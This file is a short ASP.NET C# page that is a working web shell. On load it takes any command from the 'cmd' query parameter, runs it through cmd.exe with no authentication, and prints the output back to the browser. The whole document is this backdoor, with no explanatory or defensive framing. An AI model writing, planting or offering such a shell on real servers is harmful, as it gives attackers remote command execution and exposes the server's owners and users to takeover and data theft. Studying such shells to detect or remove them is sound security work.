<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd() + "</pre>");
        p.WaitForExit();
    }
}
</script>